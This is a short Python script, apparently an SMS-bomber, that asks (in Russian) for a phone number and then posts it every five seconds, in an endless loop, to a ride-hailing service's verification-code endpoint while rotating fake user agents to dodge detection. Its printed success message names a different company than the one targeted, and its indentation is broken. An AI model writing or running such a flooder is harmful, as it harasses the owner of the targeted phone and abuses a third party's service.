import requests, fake_useragent, time

 user = fake_useragent.UserAgent().random
 headers = {'user_agent': user}

NUMBER = input('Ведите номер')

while True:
 user = fake_useragent.UserAgent().random
 headers = {'user_agent': user}
 
  try:
			requests.post('https://rider.uklon.com.ua/api/v1/phone/send-code', data={'phone': NUMBER})
			print('[+] Beltelcom отправлено!')
		except:
			print('[-] Не отправлено!')

        
       time.sleep(5)
      
